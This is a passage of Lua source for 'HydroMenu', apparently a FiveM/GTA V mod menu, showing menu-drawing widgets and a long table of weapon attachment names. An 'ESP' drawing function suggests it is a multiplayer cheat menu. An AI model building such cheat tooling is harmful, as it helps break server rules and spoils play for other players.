		local y = menu.y + HydroMenu.UI.TitleHeight + HydroMenu.UI.ButtonHeight + (HydroMenu.UI.ButtonHeight * multiplier) - HydroMenu.UI.ButtonHeight / 2
		local backgroundColor = nil

		if menu.currentOption == HydroMenu.optionCount then
			backgroundColor = {r = HydroMenu.rgb.r, g = HydroMenu.rgb.g, b = HydroMenu.rgb.b, a = 180}
			Alignment = 3
		else
			backgroundColor = menu.menuBackgroundColor
			Alignment = 2
		end


		if not HasStreamedTextureDictLoaded('commonmenu') then RequestStreamedTextureDict('commonmenu', true) end

		HydroMenu.DrawRect(x, y, menu.width, HydroMenu.UI.ButtonHeight, backgroundColor)
		
		HydroMenu.DrawText(text, {menu.x + 0.005, y - (HydroMenu.UI.ButtonHeight / 2) + 0.005}, {255, 255, 255, 255}, HydroMenu.UI.ButtonScale, 0, 0)
	
		HydroMenu.DrawText(subText, {menu.width + 0.005, y - HydroMenu.UI.ButtonHeight / 2 + 0.005}, {255, 255, 255, 255}, HydroMenu.UI.ButtonScale, 0, Alignment)
		
		if menu.currentOption == HydroMenu.optionCount then
			HydroMenu.DrawSprite('commonmenu', 'arrowright', HydroMenu.UI.MenuX + menu.width - 0.0075, y, 0.0205, 0.0205 * HydroMenu.ScreenWidth / HydroMenu.ScreenHeight, 0.0, 255, 255, 255, 255)
			
			HydroMenu.DrawSprite('commonmenu', 'arrowright', HydroMenu.UI.MenuX + menu.width - 0.0175, y, 0.0205, 0.0205 * HydroMenu.ScreenWidth / HydroMenu.ScreenHeight, 180.0, 255, 255, 255, 255)
		end
	end
end


function HydroMenu.CreateMenu(id, title, subtitle)
	-- Default settings
	HydroMenu.menus[id] = { }
	HydroMenu.menus[id].title = title
	HydroMenu.menus[id].subTitle = subtitle

	HydroMenu.menus[id].visible = false

	HydroMenu.menus[id].previousMenu = nil

	HydroMenu.menus[id].aboutToBeClosed = false

	HydroMenu.menus[id].x = 0.75
	HydroMenu.menus[id].y = 0.025
	HydroMenu.menus[id].width = 0.24

	HydroMenu.menus[id].currentOption = 1
	HydroMenu.menus[id].maxOptionCount = HydroMenu.UI.MaximumOptionCount

	HydroMenu.menus[id].titleFont = 6
	HydroMenu.menus[id].titleColor = { r = 255, g = 255, b = 255, a = 255 }
	HydroMenu.menus[id].titleBackgroundColor = { r = 255, g = 0, b = 0, a = 255 }
	HydroMenu.menus[id].titleBackgroundSprite = nil

	HydroMenu.menus[id].menuTextColor = { r = 255, g = 255, b = 255, a = 255 }
	HydroMenu.menus[id].menuSubTextColor = { r = 189, g = 189, b = 189, a = 255 }
	HydroMenu.menus[id].menuFocusTextColor = { r = 255, g = 255, b = 255, a = 255 }
	HydroMenu.menus[id].menuFocusBackgroundColor = { r = 245, g = 245, b = 245, a = 255 }
	HydroMenu.menus[id].menuBackgroundColor = { r = 0, g = 0, b = 0, a = 160 }

	HydroMenu.menus[id].subTitleBackgroundColor = { r = HydroMenu.menus[id].menuBackgroundColor.r, g = HydroMenu.menus[id].menuBackgroundColor.g, b = HydroMenu.menus[id].menuBackgroundColor.b, a = 255 }

	HydroMenu.menus[id].buttonPressedSound = { name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET" } --https://pastebin.com/0neZdsZ5
end

function HydroMenu.CreateSubMenu(id, parent, subTitle)
	if HydroMenu.menus[parent] then
		HydroMenu.CreateMenu(id, HydroMenu.menus[parent].title)

		if subTitle then
			HydroMenu.SetMenuProperty(id, 'subTitle', subTitle)
		else
			HydroMenu.SetMenuProperty(id, 'subTitle', HydroMenu.menus[parent].subTitle)
		end

		HydroMenu.SetMenuProperty(id, 'previousMenu', parent)

		HydroMenu.SetMenuProperty(id, 'x', HydroMenu.menus[parent].x)
		HydroMenu.SetMenuProperty(id, 'y', HydroMenu.menus[parent].y)
		HydroMenu.SetMenuProperty(id, 'maxOptionCount', HydroMenu.menus[parent].maxOptionCount)
		HydroMenu.SetMenuProperty(id, 'titleFont', HydroMenu.menus[parent].titleFont)
		HydroMenu.SetMenuProperty(id, 'titleColor', HydroMenu.menus[parent].titleColor)
		HydroMenu.SetMenuProperty(id, 'titleBackgroundColor', HydroMenu.menus[parent].titleBackgroundColor)
		HydroMenu.SetMenuProperty(id, 'titleBackgroundSprite', HydroMenu.menus[parent].titleBackgroundSprite)
		HydroMenu.SetMenuProperty(id, 'menuTextColor', HydroMenu.menus[parent].menuTextColor)
		HydroMenu.SetMenuProperty(id, 'menuSubTextColor', HydroMenu.menus[parent].menuSubTextColor)
		HydroMenu.SetMenuProperty(id, 'menuFocusTextColor', HydroMenu.menus[parent].menuFocusTextColor)
		HydroMenu.SetMenuProperty(id, 'menuFocusBackgroundColor', HydroMenu.menus[parent].menuFocusBackgroundColor)
		HydroMenu.SetMenuProperty(id, 'menuBackgroundColor', HydroMenu.menus[parent].menuBackgroundColor)
		HydroMenu.SetMenuProperty(id, 'subTitleBackgroundColor', HydroMenu.menus[parent].subTitleBackgroundColor)
	end
end

function HydroMenu.MenuButton(text, id, bottomText)
	local buttonText = text
	local menu = HydroMenu.menus[HydroMenu.currentMenu]
	if menu then
		HydroMenu.optionCount = HydroMenu.optionCount + 1

		local isCurrent = menu.currentOption == HydroMenu.optionCount

		HydroMenu.drawButton(text, nil, true, bottomText)

		if isCurrent then
			if IsDisabledControlJustPressed(0, 201) then
				PlaySoundFrontend(-1, menu.buttonPressedSound.name, menu.buttonPressedSound.set, true)
				HydroMenu.SetMenuVisible(HydroMenu.currentMenu, false)
				HydroMenu.SetMenuProperty(id, 'x', HydroMenu.UI.MenuX)
				HydroMenu.SetMenuProperty(id, 'y', HydroMenu.UI.MenuY)
				HydroMenu.SetMenuVisible(id, true, true)
				return true
			elseif IsDisabledControlJustPressed(0, 189) or IsDisabledControlJustPressed(0, 190) then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			end
		end

		return false
	else
		return false
	end
end

function HydroMenu.CurrentMenu()
	return HydroMenu.currentMenu
end

PlaySoundFrontend(-1, "BASE_JUMP_PASSED", "HUD_AWARDS", true)

function HydroMenu.ValueChanger(text, index, changeamout, minmaxvalues, callback, sensitivity)

	lowestvalue, highestvalue = table.unpack(minmaxvalues)

	if index == nil then
		index = 0
	end

	local menu = HydroMenu.menus[HydroMenu.currentMenu]

	if menu then

		HydroMenu.optionCount = HydroMenu.optionCount + 1

		local retval = HydroMenu.DrawChanger(text, tostring(index))

		if menu.currentOption == HydroMenu.optionCount then
			if sensitivity then
				if IsDisabledControlPressed(0, 189) then
					if index > lowestvalue then
						callback(index - changeamout)
					end
				end
				if IsDisabledControlPressed(0, 190) then
					if index < highestvalue then
						callback(index + changeamout)
					end
				end
			else
				if IsDisabledControlJustPressed(0, 189) then
					if index > lowestvalue then
						callback(index - changeamout)
					end
				end
				if IsDisabledControlJustPressed(0, 190) then
					if index < highestvalue then
						callback(index + changeamout)
					end
				end
			end
		end

		if retval then
	        return true
		end
	end
	return false
end

function HydroMenu.ComboBox(text, items, index, callback)
	
	local itemsCount = #items
	local selectedItem = items[index]
	local buttonText = text

	local menu = HydroMenu.menus[HydroMenu.currentMenu]

	if menu then

		HydroMenu.optionCount = HydroMenu.optionCount + 1

		HydroMenu.DrawChanger(text, selectedItem)

		if menu.currentOption == HydroMenu.optionCount then
			if IsDisabledControlJustPressed(0, 189) then
				if index > 1 then
					callback(index - 1)
				elseif index == 1 then
					callback(itemsCount)
				end
			end
			if IsDisabledControlJustPressed(0, 190) then
				if itemsCount > index then
					callback(index + 1)
				elseif index == itemsCount then
					callback(1)
				end
			end
			if IsDisabledControlJustPressed(0, 201) then
				PlaySoundFrontend(-1, menu.buttonPressedSound.name, menu.buttonPressedSound.set, true)
				return true
			elseif IsDisabledControlJustPressed(0, 189) or IsDisabledControlJustPressed(0, 190) then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			end
		end

		return false
	else
		return false
	end
end

function HydroMenu.Button(text, subText, bottomText)
	local buttonText = text
	if subText then
		buttonText = '{ '..tostring(buttonText)..', '..tostring(subText)..' }'
	end
	local menu = HydroMenu.menus[HydroMenu.currentMenu]
	if menu then
		HydroMenu.optionCount = HydroMenu.optionCount + 1

		HydroMenu.drawButton(text, subText, false, bottomText)

		if menu.currentOption == HydroMenu.optionCount then
			if IsDisabledControlJustPressed(0, 201) then
				PlaySoundFrontend(-1, menu.buttonPressedSound.name, menu.buttonPressedSound.set, true)
				return true
			elseif IsDisabledControlJustPressed(0, 189) or IsDisabledControlJustPressed(0, 190) then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			end
		end

		return false
	else
		return false
	end
end

function HydroMenu.CheckBox(text, checked, bottomText)
	local buttonText = text
	local menu = HydroMenu.menus[HydroMenu.currentMenu]
	if menu then
		HydroMenu.optionCount = HydroMenu.optionCount + 1

		local isCurrent = menu.currentOption == HydroMenu.optionCount

		HydroMenu.drawButton(text, (checked and "On" or "Off"), false, bottomText)

		if isCurrent then
			if IsDisabledControlJustPressed(0, 201) then
				PlaySoundFrontend(-1, menu.buttonPressedSound.name, menu.buttonPressedSound.set, true)
				return true
			elseif IsDisabledControlJustPressed(0, 189) or IsDisabledControlJustPressed(0, 190) then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			end
		end

		return false
	else
		return false
	end
end

function HydroMenu.ESP.DrawRect(Location, Size, Color)
    SetDrawOrigin(Location.x, Location.y, Location.z, 0)
	HydroMenu.DrawSprite("", "", 0.0, 0.0, Size.Width, Size.Height, 0.0, Color.r, Color.g, Color.b, Color.a)
	ClearDrawOrigin()
end

function HydroMenu.Display()
	if HydroMenu.IsMenuVisible(HydroMenu.currentMenu) then
		DisableControlAction(0, 187, true)
		DisableControlAction(0, 188, true)
		DisableControlAction(0, 189, true)
		DisableControlAction(0, 190, true)
		DisableControlAction(0, 201, true)
		DisableControlAction(0, 202, true)

		DisableControlAction(0, 24, true)
		DisableControlAction(0, 27, true)

		local menu = HydroMenu.menus[HydroMenu.currentMenu]

		if menu.currentOption > HydroMenu.optionCount then
			HydroMenu.menus[HydroMenu.currentMenu].currentOption = HydroMenu.CurrentOption
		end
		
		if menu.aboutToBeClosed then
			HydroMenu.CloseMenu()
		else
			ClearAllHelpMessages()

			if HydroMenu.menus[HydroMenu.currentMenu].currentOption == nil then
				HydroMenu.menus[HydroMenu.currentMenu].currentOption = HydroMenu.optionCount
			end
			
			HydroMenu.DrawTitle()
			HydroMenu.DrawSubTitle()
			HydroMenu.DrawBottom()

			if IsDisabledControlJustReleased(0, 187) then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

				if menu.currentOption < HydroMenu.optionCount then
					menu.currentOption = menu.currentOption + 1
				else
					menu.currentOption = 1
				end
			elseif IsDisabledControlJustReleased(0, 188) then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

				if menu.currentOption > 1 then
					menu.currentOption = menu.currentOption - 1
				else
					menu.currentOption = HydroMenu.optionCount
				end
			elseif IsDisabledControlJustReleased(0, 202) then
				if HydroMenu.menus[menu.previousMenu] then
					PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
					HydroMenu.SetMenuVisible(HydroMenu.currentMenu, false)
					HydroMenu.SetMenuProperty(menu.previousMenu, 'x', HydroMenu.UI.MenuX)
					HydroMenu.SetMenuProperty(menu.previousMenu, 'y', HydroMenu.UI.MenuY)
					HydroMenu.SetMenuVisible(menu.previousMenu, true)
				else
					HydroMenu.CloseMenu()
				end
			end

			HydroMenu.optionCount = 0
		end
	end
end

function HydroMenu.IsMenuOpened(id)
	return HydroMenu.IsMenuVisible(id)
end

function HydroMenu.OpenMenu(id)
	if id and HydroMenu.menus[id] then
		PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
		HydroMenu.SetMenuVisible(id, true)
	end
end

------------------------------------------------------
--------------------- Menu Code ----------------------
------------------------------------------------------


local globalAttachmentTable = {  
	-- Putting these at the top makes them work properly as they need to be applied to the weapon first before other attachments
	{ "COMPONENT_ADVANCEDRIFLE_VARMOD_LUXE", "Yusuf Amir Luxury Finish" },
	{ "COMPONENT_CARBINERIFLE_VARMOD_LUXE", "Yusuf Amir Luxury Finish" },
	{ "COMPONENT_ASSAULTRIFLE_VARMOD_LUXE", "Yusuf Amir Luxury Finish" },
	{ "COMPONENT_MICROSMG_VARMOD_LUXE", "Yusuf Amir Luxury Finish" },
	{ "COMPONENT_SAWNOFFSHOTGUN_VARMOD_LUXE", "Yusuf Amir Luxury Finish" },
	{ "COMPONENT_SNIPERRIFLE_VARMOD_LUXE", "Yusuf Amir Luxury Finish" },
	{ "COMPONENT_PISTOL_VARMOD_LUXE", "Yusuf Amir Luxury Finish" },
	{ "COMPONENT_PISTOL50_VARMOD_LUXE", "Yusuf Amir Luxury Finish" },
	{ "COMPONENT_APPISTOL_VARMOD_LUXE", "Yusuf Amir Luxury Finish" },
	{ "COMPONENT_HEAVYPISTOL_VARMOD_LUXE", "Yusuf Amir Luxury Finish" },
	{ "COMPONENT_SMG_VARMOD_LUXE", "Yusuf Amir Luxury Finish" },
	{ "COMPONENT_MARKSMANRIFLE_VARMOD_LUXE", "Yusuf Amir Luxury Finish" },

	{ "COMPONENT_COMBATPISTOL_VARMOD_LOWRIDER", "Lowrider Finish" },
	{ "COMPONENT_SPECIALCARBINE_VARMOD_LOWRIDER", "Lowrider Finish" },
	{ "COMPONENT_SNSPISTOL_VARMOD_LOWRIDER", "Lowrider Finish" },
	{ "COMPONENT_MG_COMBATMG_LOWRIDER", "Lowrider Finish" },
	{ "COMPONENT_BULLPUPRIFLE_VARMOD_LOWRIDER", "Lowrider Finish" },
	{ "COMPONENT_MG_VARMOD_LOWRIDER", "Lowrider Finish" },
	{ "COMPONENT_ASSAULTSMG_VARMOD_LOWRIDER", "Lowrider Finish" },
	{ "COMPONENT_PUMPSHOTGUN_VARMOD_LOWRIDER", "Lowrider Finish" },

	{ "COMPONENT_CARBINERIFLE_MK2_CLIP_02", "Extended Magazine" },
	{ "COMPONENT_MARKSMANRIFLE_MK2_CLIP_02", "Extended Magazine" },
	{ "COMPONENT_SPECIALCARBINE_MK2_CLIP_02", "Extended Magazine" },
	{ "COMPONENT_BULLPUPRIFLE_MK2_CLIP_02", "Extended Magazine" },
	{ "COMPONENT_HEAVYSNIPER_MK2_CLIP_02", "Extended Magazine" },
	{ "COMPONENT_COMBATMG_MK2_CLIP_02", "Extended Magazine" },
	{ "COMPONENT_ASSAULTRIFLE_MK2_CLIP_02", "Extended Magazine" },
	{ "COMPONENT_SMG_MK2_CLIP_02", "Extended Magazine" },
	{ "COMPONENT_PISTOL_MK2_CLIP_02", "Extended Magazine" },
	{ "COMPONENT_PISTOL_CLIP_02", "Extended Magazine" },
	{ "COMPONENT_ASSAULTSHOTGUN_CLIP_02", "Extended Magazine" },
	{ "COMPONENT_HEAVYSHOTGUN_CLIP_02", "Extended Magazine" },
	{ "COMPONENT_PISTOL50_CLIP_02", "Extended Magazine" },
	{ "COMPONENT_COMBATPISTOL_CLIP_02", "Extended Magazine" },
	{ "COMPONENT_APPISTOL_CLIP_02", "Extended Magazine" },
	{ "COMPONENT_COMBATPDW_CLIP_02", "Extended Magazine" },
	{ "COMPONENT_SNSPISTOL_CLIP_02", "Extended Magazine" },
	{ "COMPONENT_SNSPISTOL_MK2_CLIP_02", "Extended Magazine" },
	{ "COMPONENT_ASSAULTRIFLE_CLIP_02", "Extended Magazine" },
	{ "COMPONENT_COMBATMG_CLIP_02", "Extended Magazine" },
	{ "COMPONENT_MG_CLIP_02", "Extended Magazine" },
	{ "COMPONENT_ASSAULTSMG_CLIP_02", "Extended Magazine" },
	{ "COMPONENT_GUSENBERG_CLIP_02", "Extended Magazine" },
	{ "COMPONENT_MICROSMG_CLIP_02", "Extended Magazine" },
	{ "COMPONENT_BULLPUPRIFLE_CLIP_02", "Extended Magazine" },
	{ "COMPONENT_COMPACTRIFLE_CLIP_02", "Extended Magazine" },
	{ "COMPONENT_HEAVYPISTOL_CLIP_02", "Extended Magazine" },
	{ "COMPONENT_VINTAGEPISTOL_CLIP_02", "Extended Magazine" },
	{ "COMPONENT_CARBINERIFLE_CLIP_02", "Extended Magazine" },
	{ "COMPONENT_ADVANCEDRIFLE_CLIP_02", "Extended Magazine" },
	{ "COMPONENT_MARKSMANRIFLE_CLIP_02", "Extended Magazine" },
	{ "COMPONENT_SMG_CLIP_02", "Extended Magazine" },
	{ "COMPONENT_SPECIALCARBINE_CLIP_02", "Extended Magazine" },

	{ "COMPONENT_SPECIALCARBINE_CLIP_03", "Drum Magazine" },
	{ "COMPONENT_COMPACTRIFLE_CLIP_03", "Drum Magazine" },
	{ "COMPONENT_COMBATPDW_CLIP_03", "Drum Magazine" },
	{ "COMPONENT_ASSAULTRIFLE_CLIP_03", "Drum Magazine" },
	{ "COMPONENT_HEAVYSHOTGUN_CLIP_03", "Drum Magazine" },
	{ "COMPONENT_CARBINERIFLE_CLIP_03", "Drum Magazine" },
	{ "COMPONENT_SMG_CLIP_03", "Drum Magazine" },

	{ "COMPONENT_BULLPUPRIFLE_MK2_CLIP_TRACER", "Tracer Rounds" },
	{ "COMPONENT_BULLPUPRIFLE_MK2_CLIP_INCENDIARY", "Incendiary Rounds" },
	{ "COMPONENT_BULLPUPRIFLE_MK2_CLIP_ARMORPIERCING", "Armor Piercing Rounds" },
	{ "COMPONENT_BULLPUPRIFLE_MK2_CLIP_FMJ", "Full Metal Jacket Rounds" },

	{ "COMPONENT_MARKSMANRIFLE_MK2_CLIP_TRACER", "Tracer Rounds" },
	{ "COMPONENT_MARKSMANRIFLE_MK2_CLIP_INCENDIARY", "Incendiary Rounds" },
	{ "COMPONENT_MARKSMANRIFLE_MK2_CLIP_ARMORPIERCING", "Armor Piercing Rounds" },
	{ "COMPONENT_MARKSMANRIFLE_MK2_CLIP_FMJ", "Full Metal Jacket Rounds" },

	{ "COMPONENT_SPECIALCARBINE_MK2_CLIP_TRACER", "Tracer Rounds" },
	{ "COMPONENT_SPECIALCARBINE_MK2_CLIP_INCENDIARY", "Incendiary Rounds" },
	{ "COMPONENT_SPECIALCARBINE_MK2_CLIP_ARMORPIERCING", "Armor Piercing Rounds" },
	{ "COMPONENT_SPECIALCARBINE_MK2_CLIP_FMJ", "Full Metal Jacket Rounds" },

	{ "COMPONENT_PISTOL_MK2_CLIP_TRACER", "Tracer Rounds" },
	{ "COMPONENT_PISTOL_MK2_CLIP_INCENDIARY", "Incendiary Rounds" },
	{ "COMPONENT_PISTOL_MK2_CLIP_ARMORPIERCING", "Armor Piercing Rounds" },
	{ "COMPONENT_PISTOL_MK2_CLIP_FMJ", "Full Metal Jacket Rounds" },

	{ "COMPONENT_PUMPSHOTGUN_MK2_CLIP_TRACER", "Tracer Rounds" },
	{ "COMPONENT_PUMPSHOTGUN_MK2_CLIP_INCENDIARY", "Incendiary Rounds" },
	{ "COMPONENT_PUMPSHOTGUN_MK2_CLIP_HOLLOWPOINT", "Hollowpoint Rounds" },
	{ "COMPONENT_PUMPSHOTGUN_MK2_CLIP_EXPLOSIVE", "Explosive Rounds" },

	{ "COMPONENT_SNSPISTOL_MK2_CLIP_TRACER", "Tracer Rounds" },
	{ "COMPONENT_SNSPISTOL_MK2_CLIP_INCENDIARY", "Incendiary Rounds" },
	{ "COMPONENT_SNSPISTOL_MK2_CLIP_HOLLOWPOINT", "Hollowpoint Rounds" },
	{ "COMPONENT_SNSPISTOL_MK2_CLIP_FMJ", "Full Metal Jacket Rounds" },

	{ "COMPONENT_REVOLVER_MK2_CLIP_TRACER", "Tracer Rounds" },
	{ "COMPONENT_REVOLVER_MK2_CLIP_INCENDIARY", "Incendiary Rounds" },
	{ "COMPONENT_REVOLVER_MK2_CLIP_HOLLOWPOINT", "Hollowpoint Rounds" },
	{ "COMPONENT_REVOLVER_MK2_CLIP_FMJ", "Full Metal Jacket Rounds" },

	{ "COMPONENT_SMG_MK2_CLIP_TRACER", "Tracer Rounds" },
	{ "COMPONENT_SMG_MK2_CLIP_INCENDIARY", "Incendiary Rounds" },
	{ "COMPONENT_SMG_MK2_CLIP_ARMORPIERCING", "Armor Piercing Rounds" },
	{ "COMPONENT_SMG_MK2_CLIP_FMJ", "Full Metal Jacket Rounds" },

	{ "COMPONENT_ASSAULTRIFLE_MK2_CLIP_TRACER", "Tracer Rounds" },
	{ "COMPONENT_CARBINERIFLE_MK2_CLIP_TRACER", "Tracer Rounds" },
	{ "COMPONENT_COMBATMG_MK2_CLIP_TRACER", "Tracer Rounds" },
	{ "COMPONENT_HEAVYSNIPER_MK2_CLIP_TRACER", "Tracer Rounds" },

	{ "COMPONENT_ASSAULTRIFLE_MK2_CLIP_INCENDIARY", "Incendiary Rounds" },
	{ "COMPONENT_CARBINERIFLE_MK2_CLIP_INCENDIARY", "Incendiary Rounds" },
	{ "COMPONENT_COMBATMG_MK2_CLIP_INCENDIARY", "Incendiary Rounds" },
	{ "COMPONENT_HEAVYSNIPER_MK2_CLIP_INCENDIARY", "Incendiary Rounds" },

	{ "COMPONENT_ASSAULTRIFLE_MK2_CLIP_ARMORPIERCING", "Armor Piercing Rounds" },
	{ "COMPONENT_CARBINERIFLE_MK2_CLIP_ARMORPIERCING", "Armor Piercing Rounds" },
	{ "COMPONENT_HEAVYSNIPER_MK2_CLIP_ARMORPIERCING", "Armor Piercing Rounds" },
	{ "COMPONENT_COMBATMG_MK2_CLIP_ARMORPIERCING", "Armor Piercing Rounds" },

	{ "COMPONENT_ASSAULTRIFLE_MK2_CLIP_FMJ", "Full Metal Jacket Rounds" },
	{ "COMPONENT_CARBINERIFLE_MK2_CLIP_FMJ", "Full Metal Jacket Rounds" },
	{ "COMPONENT_COMBATMG_MK2_CLIP_FMJ", "Full Metal Jacket Rounds" },
	{ "COMPONENT_HEAVYSNIPER_MK2_CLIP_FMJ", "Full Metal Jacket Rounds" },

	{ "COMPONENT_HEAVYSNIPER_MK2_CLIP_EXPLOSIVE", "Explosive Rounds" },

	{ "COMPONENT_AT_PI_FLSH_02", "Flashlight" },
	{ "COMPONENT_AT_AR_FLSH	", "Flashlight" },
	{ "COMPONENT_AT_PI_FLSH", "Flashlight" },
	{ "COMPONENT_AT_AR_FLSH", "Flashlight" },
	{ "COMPONENT_AT_PI_FLSH_03", "Flashlight" },

	{ "COMPONENT_AT_PI_SUPP", "Suppressor" },
	{ "COMPONENT_AT_PI_SUPP_02", "Suppressor" },
	{ "COMPONENT_AT_AR_SUPP", "Suppressor" },
	{ "COMPONENT_AT_AR_SUPP_02", "Suppressor" },
	{ "COMPONENT_AT_SR_SUPP", "Suppressor" },
	{ "COMPONENT_AT_SR_SUPP_03", "Suppressor" },

	{ "COMPONENT_AT_PI_COMP", "Compensator" },
	{ "COMPONENT_AT_PI_COMP_02", "Compensator" },
	{ "COMPONENT_AT_PI_COMP_03", "Compensator" },
	{ "COMPONENT_AT_MRFL_BARREL_01", "Barrel Attachment 1" },
	{ "COMPONENT_AT_MRFL_BARREL_02", "Barrel Attachment 2" },
	{ "COMPONENT_AT_SR_BARREL_01", "Barrel Attachment 1" },
	{ "COMPONENT_AT_BP_BARREL_01", "Barrel Attachment 1" },
	{ "COMPONENT_AT_BP_BARREL_02", "Barrel Attachment 2" },
	{ "COMPONENT_AT_SC_BARREL_01", "Barrel Attachment 1" },
	{ "COMPONENT_AT_SC_BARREL_02", "Barrel Attachment 2" },
	{ "COMPONENT_AT_AR_BARREL_01", "Barrel Attachment 1" },
	{ "COMPONENT_AT_SB_BARREL_01", "Barrel Attachment 1" },
	{ "COMPONENT_AT_CR_BARREL_01", "Barrel Attachment 1" },
	{ "COMPONENT_AT_MG_BARREL_01", "Barrel Attachment 1" },
	{ "COMPONENT_AT_MG_BARREL_02", "Barrel Attachment 2" },
	{ "COMPONENT_AT_CR_BARREL_02", "Barrel Attachment 2" },
	{ "COMPONENT_AT_SR_BARREL_02", "Barrel Attachment 2" },
	{ "COMPONENT_AT_SB_BARREL_02", "Barrel Attachment 2" },
	{ "COMPONENT_AT_AR_BARREL_02", "Barrel Attachment 2" },
	{ "COMPONENT_AT_MUZZLE_01", "Muzzle Attachment 1" },
	{ "COMPONENT_AT_MUZZLE_02", "Muzzle Attachment 2" },
	{ "COMPONENT_AT_MUZZLE_03", "Muzzle Attachment 3" },
	{ "COMPONENT_AT_MUZZLE_04", "Muzzle Attachment 4" },
	{ "COMPONENT_AT_MUZZLE_05", "Muzzle Attachment 5" },
	{ "COMPONENT_AT_MUZZLE_06", "Muzzle Attachment 6" },
	{ "COMPONENT_AT_MUZZLE_07", "Muzzle Attachment 7" },

	{ "COMPONENT_AT_AR_AFGRIP", "Grip" },
	{ "COMPONENT_AT_AR_AFGRIP_02", "Grip" },

	{ "COMPONENT_AT_PI_RAIL", "Holographic Sight" },
	{ "COMPONENT_AT_SCOPE_MACRO_MK2", "Holographic Sight" },
	{ "COMPONENT_AT_PI_RAIL_02", "Holographic Sight" },
	{ "COMPONENT_AT_SIGHTS_SMG", "Holographic Sight" },
	{ "COMPONENT_AT_SIGHTS", "Holographic Sight" },

	{ "COMPONENT_AT_SCOPE_SMALL", "Scope Small" },
	{ "COMPONENT_AT_SCOPE_SMALL_02", "Scope Small" },

	{ "COMPONENT_AT_SCOPE_MACRO_02", "Scope" },
	{ "COMPONENT_AT_SCOPE_SMALL_02", "Scope" },
	{ "COMPONENT_AT_SCOPE_MACRO", "Scope" },
	{ "COMPONENT_AT_SCOPE_MEDIUM", "Scope" },
	{ "COMPONENT_AT_SCOPE_LARGE", "Scope" },
	{ "COMPONENT_AT_SCOPE_SMALL", "Scope" },

	{ "COMPONENT_AT_SCOPE_MACRO_02_SMG_MK2", "2x Scope" },
	{ "COMPONENT_AT_SCOPE_SMALL_MK2", "2x Scope" },

	{ "COMPONENT_AT_SCOPE_SMALL_SMG_MK2", "4x Scope" },
	{ "COMPONENT_AT_SCOPE_MEDIUM_MK2", "4x Scope" },

	{ "COMPONENT_AT_SCOPE_MAX", "Advanced Scope" },
	{ "COMPONENT_AT_SCOPE_LARGE", "Scope Large" },
	{ "COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM_MK2", "Scope Large" },
	{ "COMPONENT_AT_SCOPE_LARGE_MK2", "8x Scope" },

	{ "COMPONENT_AT_SCOPE_NV", "Nightvision Scope" },
	{ "COMPONENT_AT_SCOPE_THERMAL", "Thermal Scope" },

	--{ "COMPONENT_KNUCKLE_VARMOD_PLAYER", "Default Skin" },
	{ "COMPONENT_KNUCKLE_VARMOD_LOVE", "Love Skin" },
	{ "COMPONENT_KNUCKLE_VARMOD_DOLLAR", "Dollar Skin" },
	{ "COMPONENT_KNUCKLE_VARMOD_VAGOS", "Vagos Skin" },
	{ "COMPONENT_KNUCKLE_VARMOD_HATE", "Hate Skin" },
	{ "COMPONENT_KNUCKLE_VARMOD_DIAMOND", "Diamond Skin" },
	{ "COMPONENT_KNUCKLE_VARMOD_PIMP", "Pimp Skin" },
	{ "COMPONENT_KNUCKLE_VARMOD_KING", "King Skin" },
	{ "COMPONENT_KNUCKLE_VARMOD_BALLAS", "Ballas Skin" },
	{ "COMPONENT_KNUCKLE_VARMOD_BASE", "Base Skin" },
	{ "COMPONENT_SWITCHBLADE_VARMOD_VAR1", "Default Skin" },
	{ "COMPONENT_SWITCHBLADE_VARMOD_VAR2", "Variant 2 Skin" },
	--{ "COMPONENT_SWITCHBLADE_VARMOD_BASE", "Base Skin" },

	{ "COMPONENT_MARKSMANRIFLERIFLE_MK2_CAMO", "Camo 1" },
	{ "COMPONENT_MARKSMANRIFLERIFLE_MK2_CAMO_02", "Camo 2" },
	{ "COMPONENT_MARKSMANRIFLERIFLE_MK2_CAMO_03", "Camo 3" },
	{ "COMPONENT_MARKSMANRIFLERIFLE_MK2_CAMO_04", "Camo 4" },
	{ "COMPONENT_MARKSMANRIFLERIFLE_MK2_CAMO_05", "Camo 5" },
	{ "COMPONENT_MARKSMANRIFLERIFLE_MK2_CAMO_06", "Camo 6" },
	{ "COMPONENT_MARKSMANRIFLERIFLE_MK2_CAMO_07", "Camo 7" },
	{ "COMPONENT_MARKSMANRIFLERIFLE_MK2_CAMO_08", "Camo 8" },
	{ "COMPONENT_MARKSMANRIFLERIFLE_MK2_CAMO_09", "Camo 9" },
	{ "COMPONENT_MARKSMANRIFLERIFLE_MK2_CAMO_10", "Camo 10" },
	{ "COMPONENT_MARKSMANRIFLERIFLE_MK2_CAMO_IND_01", "American Camo" },

	{ "COMPONENT_BULLPUPRIFLE_MK2_CAMO", "Camo 1" },
	{ "COMPONENT_BULLPUPRIFLE_MK2_CAMO_02", "Camo 2" },
	{ "COMPONENT_BULLPUPRIFLE_MK2_CAMO_03", "Camo 3" },
	{ "COMPONENT_BULLPUPRIFLE_MK2_CAMO_04", "Camo 4" },
	{ "COMPONENT_BULLPUPRIFLE_MK2_CAMO_05", "Camo 5" },
	{ "COMPONENT_BULLPUPRIFLE_MK2_CAMO_06", "Camo 6" },
	{ "COMPONENT_BULLPUPRIFLE_MK2_CAMO_07", "Camo 7" },
	{ "COMPONENT_BULLPUPRIFLE_MK2_CAMO_08", "Camo 8" },
	{ "COMPONENT_BULLPUPRIFLE_MK2_CAMO_09", "Camo 9" },
	{ "COMPONENT_BULLPUPRIFLE_MK2_CAMO_10", "Camo 10" },
	{ "COMPONENT_BULLPUPRIFLE_MK2_CAMO_IND_01", "American Camo" },

